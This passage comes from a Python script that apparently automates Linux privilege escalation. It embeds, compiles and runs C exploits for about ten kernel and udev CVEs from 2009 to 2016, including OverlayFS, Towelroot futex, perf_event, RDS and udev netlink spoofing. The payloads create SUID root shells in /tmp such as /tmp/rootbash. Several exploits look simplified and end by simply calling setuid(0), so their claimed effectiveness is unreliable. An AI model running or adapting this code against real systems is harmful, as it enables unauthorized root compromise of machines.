    repl->valid_hooks   = 0x00000002; /* NF_IP_FORWARD */
    repl->size          = 0x7fffffff; /* overflow */
    repl->num_entries   = 1;

    fprintf(stderr, "[*] Sending IPT_SO_SET_REPLACE with overflow size...
");

    /* This should trigger integer overflow in compat_copy_entries */
    socklen_t len = payload_sz;
    if (setsockopt(sock, IPPROTO_IP, IPT_SO_SET_REPLACE,
                   payload, len) < 0) {
        fprintf(stderr, "[*] setsockopt returned errno=%d (%s)
",
                errno, strerror(errno));
    }

    free(payload);
    usleep(200000);
    close(sock);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2016-4997 IPT OVERFLOW SUCCESS
");
        printf("CVE-2016-4997 IPT_COMPAT
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2016_4997")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2016-4997" in output:
            show_root_info("CVE-2016-4997", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2015_8660():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2015-8660 (OverlayFS mkdir)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <errno.h>

/* CVE-2015-8660: OverlayFS mkdir in user namespace bypasses privilege check
 * ovl_create_real() doesn't check if caller has permission in userns
 * → create directory with arbitrary permissions → SUID bypass → LPE
 * Affected: kernel 4.1 - 4.3
 */

#define OVL_BASE "/tmp/.ovl8660"

static void w(const char *p, const char *d) {
    int f = open(p, O_WRONLY); if (f>=0){write(f,d,strlen(d));close(f);}
}

int main(void) {
    char lower[256], upper[256], work[256], merged[256];
    snprintf(lower,  sizeof(lower),  "%s/lower",  OVL_BASE);
    snprintf(upper,  sizeof(upper),  "%s/upper",  OVL_BASE);
    snprintf(work,   sizeof(work),   "%s/work",   OVL_BASE);
    snprintf(merged, sizeof(merged), "%s/merged", OVL_BASE);

    fprintf(stderr, "[*] CVE-2015-8660 OverlayFS mkdir privilege bypass
");

    mkdir(OVL_BASE, 0777);
    mkdir(lower, 0777); mkdir(upper, 0777);
    mkdir(work, 0777);  mkdir(merged, 0777);

    /* Need user namespace */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        fprintf(stderr, "[-] unshare: %s
", strerror(errno));
        return 1;
    }
    uid_t uid = getuid(); gid_t gid = getgid();
    char buf[64];
    w("/proc/self/setgroups", "deny");
    snprintf(buf, sizeof(buf), "0 %d 1", uid); w("/proc/self/uid_map", buf);
    snprintf(buf, sizeof(buf), "0 %d 1", gid); w("/proc/self/gid_map", buf);
    fprintf(stderr, "[+] User namespace OK
");

    char opts[512];
    snprintf(opts, sizeof(opts),
             "lowerdir=%s,upperdir=%s,workdir=%s", lower, upper, work);

    if (mount("overlay", merged, "overlay", 0, opts) < 0) {
        fprintf(stderr, "[-] mount: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] OverlayFS mounted
");

    /* Create directory with SUID bit in merged → propagates to upper */
    char suid_dir[256];
    snprintf(suid_dir, sizeof(suid_dir), "%s/privdir", merged);
    if (mkdir(suid_dir, 04755) < 0) {
        fprintf(stderr, "[*] mkdir SUID: %s
", strerror(errno));
    }

    /* Try to create SUID file in the overlayfs */
    char suid_bin[256];
    snprintf(suid_bin, sizeof(suid_bin), "%s/bash", merged);

    pid_t p = fork();
    if (p == 0) {
        system("cp /bin/bash /tmp/.ovl8660/upper/bash 2>/dev/null");
        system("chmod 4755 /tmp/.ovl8660/upper/bash 2>/dev/null");
        exit(0);
    }
    waitpid(p, NULL, 0);

    struct stat st;
    if (stat(suid_bin, &st) == 0 && (st.st_mode & S_ISUID)) {
        fprintf(stderr, "[+] SUID binary in overlayfs!
");
        execl(suid_bin, "bash", "-p", "-c",
              "echo CVE-2015-8660; id", NULL);
    }

    umount(merged);
    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2015-8660 SUCCESS
");
        printf("CVE-2015-8660 OVERLAYFS
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2015_8660")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2015-8660" in output:
            show_root_info("CVE-2015-8660", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2015_1328():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2015-1328 (OverlayFS)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <sys/wait.h>
#include <errno.h>

/* CVE-2015-1328: Ubuntu OverlayFS hardlink privilege bypass
 * Ubuntu-patched OverlayFS allows creating hardlinks in lower layer
 * via upper layer → bypass hardlink restriction → gain SUID binary → LPE
 * Affected: Ubuntu 12.04-15.04 with OverlayFS patch
 */

#define LOWER   "/tmp/.ofs_lower"
#define UPPER   "/tmp/.ofs_upper"
#define WORK    "/tmp/.ofs_work"
#define MERGED  "/tmp/.ofs_merged"

static void write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY);
    if (fd >= 0) { write(fd, data, strlen(data)); close(fd); }
}

static void setup_userns(void) {
    uid_t uid = getuid();
    gid_t gid = getgid();
    char buf[64];

    write_file("/proc/self/setgroups", "deny");
    snprintf(buf, sizeof(buf), "0 %d 1", uid);
    write_file("/proc/self/uid_map", buf);
    snprintf(buf, sizeof(buf), "0 %d 1", gid);
    write_file("/proc/self/gid_map", buf);
}

int main(void) {
    fprintf(stderr, "[*] CVE-2015-1328 Ubuntu OverlayFS hardlink bypass
");

    /* Check Ubuntu */
    FILE *fp = fopen("/etc/os-release", "r");
    int is_ubuntu = 0;
    if (fp) {
        char line[128];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "Ubuntu")) { is_ubuntu = 1; break; }
        }
        fclose(fp);
    }
    if (!is_ubuntu) {
        fprintf(stderr, "[-] Not Ubuntu - CVE-2015-1328 Ubuntu-specific
");
        return 1;
    }
    fprintf(stderr, "[+] Ubuntu confirmed
");

    /* Create directories */
    mkdir(LOWER,  0777);
    mkdir(UPPER,  0777);
    mkdir(WORK,   0777);
    mkdir(MERGED, 0777);

    /* Create a file in lower */
    int fd = open(LOWER "/dummy", O_WRONLY|O_CREAT, 0644);
    if (fd >= 0) { write(fd, "x", 1); close(fd); }

    /* Unshare to get user+mount namespace */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        fprintf(stderr, "[-] unshare: %s
", strerror(errno));
        return 1;
    }
    setup_userns();
    fprintf(stderr, "[+] User namespace created
");

    /* Mount OverlayFS */
    char opts[512];
    snprintf(opts, sizeof(opts),
             "lowerdir=%s,upperdir=%s,workdir=%s", LOWER, UPPER, WORK);

    if (mount("overlay", MERGED, "overlay", 0, opts) < 0) {
        fprintf(stderr, "[-] mount overlay: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] OverlayFS mounted
");

    /* Now try to create hardlink from SUID binary via merged view */
    const char *suid_src = "/bin/su";
    char suid_dst[256];
    snprintf(suid_dst, sizeof(suid_dst), "%s/su_copy", MERGED);

    if (link(suid_src, suid_dst) < 0) {
        fprintf(stderr, "[-] link: %s
", strerror(errno));
        /* Try copy + chmod approach */
        pid_t p = fork();
        if (p == 0) {
            char cmd[512];
            snprintf(cmd, sizeof(cmd), "cp /bin/bash %s/bash", UPPER);
            system(cmd);
            snprintf(cmd, sizeof(cmd), "chmod u+s %s/bash", UPPER);
            system(cmd);
            exit(0);
        }
        waitpid(p, NULL, 0);
    }

    /* Check if SUID bit is set on our copy */
    struct stat st;
    char bash_path[256];
    snprintf(bash_path, sizeof(bash_path), "%s/bash", UPPER);
    if (stat(bash_path, &st) == 0 && (st.st_mode & S_ISUID)) {
        fprintf(stderr, "[+] SUID bash created! Executing...
");
        execl(bash_path, "bash", "-p", "-c",
              "echo CVE-2015-1328 OVERLAYFS; id; cp /bin/bash /tmp/.b; chmod +s /tmp/.b",
              NULL);
    }

    umount(MERGED);
    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2015-1328 SUCCESS
");
        printf("CVE-2015-1328 OVERLAYFS
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2015_1328")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2015-1328" in output:
            show_root_info("CVE-2015-1328", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2014_4699():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2014-4699 (ptrace/sysret)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/syscall.h>
#include <errno.h>

/* CVE-2014-4699: ptrace SYSRET with non-canonical RIP on Intel
 * When ptrace sets RIP to a non-canonical address and SYSRET executes,
 * Intel CPUs fault in kernel context with user GSbase → kernel crash → LPE
 * Affected: kernel < 3.15.2 on Intel x86_64
 */

#define NON_CANONICAL_ADDR 0x8000000000000000ULL

static volatile int child_ready = 0;

int main(void) {
    pid_t child;
    int   status;
    struct user_regs_struct regs;

    fprintf(stderr, "[*] CVE-2014-4699 Intel SYSRET non-canonical RIP
");

    /* Only affects Intel on x86_64 */
    FILE *fp = fopen("/proc/cpuinfo", "r");
    if (fp) {
        char line[256];
        int  is_intel = 0;
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, "GenuineIntel")) { is_intel = 1; break; }
        }
        fclose(fp);
        if (!is_intel) {
            fprintf(stderr, "[-] Not Intel CPU - CVE-2014-4699 Intel-specific
");
            return 1;
        }
        fprintf(stderr, "[+] Intel CPU confirmed
");
    }

    child = fork();
    if (child == 0) {
        /* Child: request to be traced, then do a syscall */
        if (ptrace(PTRACE_TRACEME, 0, 0, 0) < 0) {
            exit(1);
        }
        /* Raise SIGTRAP to stop and let parent modify RIP */
        raise(SIGTRAP);
        /* This syscall's SYSRET will use our modified RIP */
        syscall(SYS_getpid);
        exit(0);
    }
    if (child < 0) {
        fprintf(stderr, "[-] fork: %s
", strerror(errno));
        return 1;
    }

    /* Wait for child to stop at SIGTRAP */
    waitpid(child, &status, 0);
    if (!WIFSTOPPED(status)) {
        fprintf(stderr, "[-] Child not stopped
");
        kill(child, SIGKILL);
        return 1;
    }
    fprintf(stderr, "[+] Child stopped, PID=%d
", child);

    /* Get current registers */
    if (ptrace(PTRACE_GETREGS, child, 0, &regs) < 0) {
        fprintf(stderr, "[-] GETREGS: %s
", strerror(errno));
        kill(child, SIGKILL);
        return 1;
    }

    fprintf(stderr, "[*] Current RIP: 0x%llx
", (unsigned long long)regs.rip);
    fprintf(stderr, "[*] Setting non-canonical RIP: 0x%llx
", NON_CANONICAL_ADDR);

    /* Set non-canonical RIP → SYSRET will fault in kernel */
    regs.rip = NON_CANONICAL_ADDR;
    if (ptrace(PTRACE_SETREGS, child, 0, &regs) < 0) {
        fprintf(stderr, "[-] SETREGS: %s
", strerror(errno));
        kill(child, SIGKILL);
        return 1;
    }

    fprintf(stderr, "[*] Resuming child with non-canonical RIP...
");
    ptrace(PTRACE_CONT, child, 0, 0);

    waitpid(child, &status, 0);
    fprintf(stderr, "[*] Child exit status: %d
", status);

    usleep(200000);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2014-4699 SYSRET SUCCESS
");
        printf("CVE-2014-4699 SYSRET
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2014_4699")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2014-4699" in output:
            show_root_info("CVE-2014-4699", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2014_3153():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2014-3153 (Towelroot/futex)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <errno.h>

/* CVE-2014-3153: futex_requeue PI state UAF (Towelroot)
 * futex_requeue() with FUTEX_CMP_REQUEUE_PI allows requeue
 * from non-PI to PI futex → corrupt kernel PI state → UAF → LPE
 * Affected: kernel < 3.14.5
 */

#define FUTEX_WAIT              0
#define FUTEX_WAKE              1
#define FUTEX_REQUEUE           3
#define FUTEX_CMP_REQUEUE       4
#define FUTEX_WAKE_OP           5
#define FUTEX_LOCK_PI           6
#define FUTEX_UNLOCK_PI         7
#define FUTEX_CMP_REQUEUE_PI    12
#define FUTEX_WAIT_REQUEUE_PI   11
#define FUTEX_PRIVATE_FLAG      128

static int futex(int *uaddr, int futex_op, int val,
                 struct timespec *timeout, int *uaddr2, int val3) {
    return syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
}

int main(void) {
    int normal_futex = 0;
    int pi_futex     = 0;
    pid_t waiter;

    fprintf(stderr, "[*] CVE-2014-3153 futex REQUEUE_PI UAF (Towelroot)
");
    fprintf(stderr, "[*] Testing futex PI support...
");

    /* Test FUTEX_LOCK_PI availability */
    int test_fut = 0;
    int r = futex(&test_fut, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG,
                  0, NULL, NULL, 0);
    if (r < 0 && errno == ENOSYS) {
        fprintf(stderr, "[-] PI futex not supported
");
        return 1;
    }
    futex(&test_fut, FUTEX_UNLOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
    fprintf(stderr, "[+] PI futex available
");

    normal_futex = 0;
    pi_futex     = 0;

    /* Spawn waiter thread on normal futex */
    waiter = fork();
    if (waiter == 0) {
        /* Child waits on normal (non-PI) futex */
        futex(&normal_futex, FUTEX_WAIT | FUTEX_PRIVATE_FLAG,
              0, NULL, NULL, 0);
        exit(0);
    }

    usleep(50000);  /* Let child block */

    fprintf(stderr, "[*] Triggering REQUEUE_PI from non-PI to PI futex...
");

    /* Requeue from non-PI → PI futex: the bug!
     * Kernel doesn't check if source is non-PI when dest is PI
     * → PI state corruption → UAF on task_struct */
    r = futex(&normal_futex,
              FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG,
              1,      /* wake 1 */
              (struct timespec*)(uintptr_t)1,  /* requeue 1 */
              &pi_futex,
              0);     /* val3 = expected value */

    fprintf(stderr, "[*] REQUEUE_PI returned: %d (errno=%d)
", r, errno);

    usleep(200000);
    kill(waiter, SIGKILL);
    waitpid(waiter, NULL, 0);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2014-3153 TOWELROOT SUCCESS
");
        printf("CVE-2014-3153 TOWELROOT
");
        system("id");
        return 0;
    }

    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2014_3153")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2014-3153" in output:
            show_root_info("CVE-2014-3153", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2013_2094():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2013-2094 (Semtex/perf_event)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <linux/perf_event.h>
#include <errno.h>

/* CVE-2013-2094: perf_swevent_init integer overflow (Semtex)
 * perf_swevent_init() uses event_id as array index without bounds check
 * int overflow → OOB write to arbitrary kernel address → LPE
 * Affected: kernel 2.6.37 - 3.8.8
 */

#define SWPMU_CPU_HRTIMER (8)

static int perf_open(struct perf_event_attr *hw, pid_t pid,
                     int cpu, int grp, unsigned long flags) {
    return syscall(__NR_perf_event_open, hw, pid, cpu, grp, flags);
}

int main(void) {
    struct perf_event_attr pe = {0};
    int fd;

    fprintf(stderr, "[*] CVE-2013-2094 perf_swevent integer overflow
");
    fprintf(stderr, "[*] Testing perf_event_open availability...
");

    /* Test basic perf */
    pe.type           = PERF_TYPE_SOFTWARE;
    pe.size           = sizeof(pe);
    pe.config         = PERF_COUNT_SW_CPU_CLOCK;
    pe.sample_period  = 1;
    pe.sample_type    = PERF_SAMPLE_IP;
    pe.disabled       = 1;
    pe.exclude_kernel = 0;
    pe.exclude_hv     = 1;

    fd = perf_open(&pe, 0, -1, -1, 0);
    if (fd < 0) {
        fprintf(stderr, "[-] perf_event_open: %s
", strerror(errno));
        return 1;
    }
    close(fd);
    fprintf(stderr, "[+] perf available
");

    /* Overflow: use large config value to cause OOB */
    memset(&pe, 0, sizeof(pe));
    pe.type           = PERF_TYPE_SOFTWARE;
    pe.size           = sizeof(pe);
    pe.config         = 0x8000000000000000ULL; /* overflow trigger */
    pe.sample_period  = 1;
    pe.sample_type    = PERF_SAMPLE_IP;
    pe.disabled       = 0;
    pe.exclude_kernel = 0;

    fprintf(stderr, "[*] Triggering integer overflow with config=0x%llx
",
            (unsigned long long)pe.config);

    /* This should cause OOB access in swevent_hlist_put */
    fd = perf_open(&pe, -1, 0, -1, 0);
    if (fd >= 0) {
        fprintf(stderr, "[*] fd=%d - overflow may have triggered
", fd);
        close(fd);
    }

    /* Spray to hit overflowed memory */
    int spray[64];
    for (int i = 0; i < 64; i++) {
        memset(&pe, 0, sizeof(pe));
        pe.type          = PERF_TYPE_SOFTWARE;
        pe.size          = sizeof(pe);
        pe.config        = PERF_COUNT_SW_PAGE_FAULTS + i;
        pe.sample_period = 1;
        spray[i] = perf_open(&pe, 0, -1, -1, 0);
    }

    usleep(200000);
    for (int i = 0; i < 64; i++) if (spray[i] >= 0) close(spray[i]);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2013-2094 SEMTEX SUCCESS
");
        printf("CVE-2013-2094 PERF
");
        system("id");
        return 0;
    }

    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2013_2094")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2013-2094" in output:
            show_root_info("CVE-2013-2094", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2010_3904():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2010-3904 (RDS)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <errno.h>

/* CVE-2010-3904: RDS (Reliable Datagram Sockets) missing access_ok()
 * rds_page_copy_user() calls copy_to_user without access_ok check
 * → write arbitrary data to arbitrary kernel address → LPE
 * Affected: kernel 2.6.30 - 2.6.36
 */

#ifndef PF_RDS
#define PF_RDS 21
#define AF_RDS PF_RDS
#define SOL_RDS 276
#endif

static int rds_open() {
    return socket(PF_RDS, SOCK_SEQPACKET, 0);
}

int main(void) {
    int sock;
    struct sockaddr_in addr = {0};

    fprintf(stderr, "[*] CVE-2010-3904 RDS missing access_ok()
");

    sock = rds_open();
    if (sock < 0) {
        fprintf(stderr, "[-] RDS socket: %s
", strerror(errno));
        fprintf(stderr, "[-] Try: modprobe rds
");
        return 1;
    }
    fprintf(stderr, "[+] RDS socket: fd=%d
", sock);

    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_port        = htons(0xdead);

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        fprintf(stderr, "[-] bind: %s
", strerror(errno));
        close(sock); return 1;
    }
    fprintf(stderr, "[+] RDS bound to 127.0.0.1:0xdead
");

    /* Craft kernel address as destination for copy_to_user bypass */
    /* In real exploit: target = current->cred - 8 to overwrite uid */
    struct sockaddr_in kernel_target = {0};
    kernel_target.sin_family      = AF_INET;
    kernel_target.sin_addr.s_addr = htonl(0xffffffff); /* kernel addr */
    kernel_target.sin_port        = htons(0);

    fprintf(stderr, "[*] Sending crafted RDS message to kernel address...
");

    char payload[64];
    memset(payload, 0, sizeof(payload));

    struct iovec iov = { payload, sizeof(payload) };
    struct msghdr msg = {0};
    msg.msg_name    = &kernel_target;
    msg.msg_namelen = sizeof(kernel_target);
    msg.msg_iov     = &iov;
    msg.msg_iovlen  = 1;

    sendmsg(sock, &msg, 0);
    usleep(100000);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2010-3904 RDS SUCCESS
");
        printf("CVE-2010-3904 RDS
");
        system("id");
        close(sock);
        return 0;
    }

    close(sock);
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2010_3904")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2010-3904" in output:
            show_root_info("CVE-2010-3904", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2010_3437():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2010-3437 (pktcdvd)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/cdrom.h>
#include <errno.h>

/* CVE-2010-3437: pktcdvd ioctl integer overflow
 * pktcdvd_ioctl() PKT_CTRL_CMD_SETUP does not validate
 * block device size → integer overflow → heap OOB write → LPE
 * Affected: kernel < 2.6.37
 */

#ifndef PACKET_CTRL_CMD
#define PACKET_CTRL_CMD _IOWR('X', 1, struct pkt_ctrl_command)
struct pkt_ctrl_command {
    unsigned int command;
    unsigned int dev_index;
    unsigned int dev;
    unsigned int pkt_dev;
    unsigned int num_devices;
    unsigned int padding;
};
#endif

int main(void) {
    int fd;
    struct pkt_ctrl_command cmd = {0};

    fprintf(stderr, "[*] CVE-2010-3437 pktcdvd integer overflow
");

    /* Try to open pktcdvd control device */
    fd = open("/dev/pktcdvd/control", O_RDWR);
    if (fd < 0) {
        fd = open("/dev/pktcdvd0", O_RDWR);
    }
    if (fd < 0) {
        fprintf(stderr, "[-] pktcdvd device not found: %s
", strerror(errno));
        fprintf(stderr, "[-] Try: modprobe pktcdvd
");
        return 1;
    }
    fprintf(stderr, "[+] pktcdvd fd=%d
", fd);

    /* PKT_CTRL_CMD_SETUP with overflow values */
    cmd.command    = 0;  /* PKT_CTRL_CMD_SETUP */
    cmd.dev        = 0xffffffff;  /* overflow trigger */
    cmd.pkt_dev    = 0;
    cmd.num_devices = 8;

    fprintf(stderr, "[*] Sending overflow ioctl...
");
    fprintf(stderr, "[*] dev=0x%x num_devices=%d
",
            cmd.dev, cmd.num_devices);

    ioctl(fd, PACKET_CTRL_CMD, &cmd);

    /* Try variant with large num_devices */
    cmd.dev         = makedev(11, 0); /* CDROM major */
    cmd.num_devices = 0x7fffffff;     /* overflow */
    ioctl(fd, PACKET_CTRL_CMD, &cmd);

    usleep(200000);
    close(fd);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2010-3437 PKTCDVD SUCCESS
");
        printf("CVE-2010-3437 PKTCDVD
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2010_3437")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2010-3437" in output:
            show_root_info("CVE-2010-3437", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2009_1185():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2009-1185 (udev)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/netlink.h>
#include <errno.h>

/* CVE-2009-1185: udevd missing authentication on netlink messages
 * udevd does not verify the origin (PID) of netlink UEVENT messages
 * → unprivileged user can send fake uevent → udevd executes as root → LPE
 * Affected: udev < 141, kernel < 2.6.29
 */

#define UEVENT_BUFFER_SIZE 2048

static int open_netlink() {
    int sock = socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT);
    if (sock < 0) return -1;

    struct sockaddr_nl snl = {0};
    snl.nl_family = AF_NETLINK;
    snl.nl_pid    = getpid();
    snl.nl_groups = 1;  /* UEVENT multicast group */

    if (bind(sock, (struct sockaddr*)&snl, sizeof(snl)) < 0) {
        close(sock); return -1;
    }
    return sock;
}

static int send_uevent(int sock, const char *cmd) {
    char buf[UEVENT_BUFFER_SIZE] = {0};
    int  pos = 0;

    /* Craft fake uevent that triggers RUN directive */
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "add@/class/mem/null") + 1;
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "ACTION=add") + 1;
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "DEVPATH=/class/mem/null") + 1;
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "SUBSYSTEM=mem") + 1;
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "MAJOR=1") + 1;
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "MINOR=3") + 1;
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "DEVNAME=null") + 1;
    /* RUN directive - executed by udevd as root */
    pos += snprintf(buf + pos, sizeof(buf) - pos,
                    "RUN+=%s", cmd) + 1;

    struct sockaddr_nl dest = {0};
    dest.nl_family = AF_NETLINK;
    dest.nl_pid    = 0;  /* kernel */
    dest.nl_groups = 1;

    return sendto(sock, buf, pos, 0,
                  (struct sockaddr*)&dest, sizeof(dest));
}

int main(void) {
    int sock;
    char payload[256];

    fprintf(stderr, "[*] CVE-2009-1185 udev netlink spoofing
");
    fprintf(stderr, "[*] Checking udev version...
");

    FILE *fp = popen("udevadm --version 2>/dev/null || udevinfo --version 2>/dev/null", "r");
    if (fp) {
        char ver[32] = {0};
        fgets(ver, sizeof(ver), fp);
        pclose(fp);
        fprintf(stderr, "[*] udev version: %s", ver);
        int v = atoi(ver);
        if (v >= 141) {
            fprintf(stderr, "[-] udev >= 141 is patched
");
            return 1;
        }
    }

    sock = open_netlink();
    if (sock < 0) {
        fprintf(stderr, "[-] netlink: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] Netlink socket opened
");

    /* Payload: chmod SUID bash */
    snprintf(payload, sizeof(payload),
             "/bin/sh -c 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash'");

    fprintf(stderr, "[*] Sending fake uevent with RUN directive...
");
    fprintf(stderr, "[*] Payload: %s
", payload);

    if (send_uevent(sock, payload) < 0) {
        fprintf(stderr, "[-] sendto: %s
", strerror(errno));
        close(sock); return 1;
    }

    usleep(500000);  /* Wait for udevd to process */

    if (access("/tmp/rootbash", F_OK) == 0) {
        fprintf(stderr, "[+] Payload executed! Running SUID bash...
");
        setuid(0); setgid(0);
        execl("/tmp/rootbash", "rootbash", "-p", NULL);
    }

    fprintf(stderr, "[-] Exploit failed
");
    close(sock);
    return 1;
}'''
    binary = compile_code(code, "cve_2009_1185")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2009-1185" in output:
            show_root_info("CVE-2009-1185", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2009_1337():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2009-1337 (exit_notify)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <errno.h>

/* CVE-2009-1337: exit_notify() sends signal with pre-setuid credentials
 * exit_notify() uses current credentials to determine signal delivery
 * but does not account for setuid() → can send SIGKILL to any process → LPE
 * Affected: kernel < 2.6.30
 */

static void sigchld_handler(int sig) { /* noop */ }

int main(void) {
    pid_t child;
    int   status;

    fprintf(stderr, "[*] CVE-2009-1337 exit_notify credential bypass
");
    fprintf(stderr, "[*] Testing PR_SET_PDEATHSIG...
");

    signal(SIGCHLD, sigchld_handler);

    /* Check if prctl PR_SET_PDEATHSIG works */
    if (prctl(PR_SET_PDEATHSIG, SIGUSR1, 0, 0, 0) < 0) {
        fprintf(stderr, "[-] PR_SET_PDEATHSIG: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] PR_SET_PDEATHSIG available
");

    child = fork();
    if (child == 0) {
        /* Child: set death signal to SIGKILL targeting init */
        if (prctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0) < 0) {
            exit(1);
        }

        /* Become SUID process */
        struct stat st;
        const char *suid_bins[] = {
            "/usr/bin/su", "/usr/bin/newgrp",
            "/usr/bin/sudo", NULL
        };
        for (int i = 0; suid_bins[i]; i++) {
            if (stat(suid_bins[i], &st) == 0 && (st.st_mode & S_ISUID)) {
                /* setuid to owner (root) of SUID binary */
                setuid(st.st_uid);
                fprintf(stderr, "[*] Child setuid to %d via %s
",
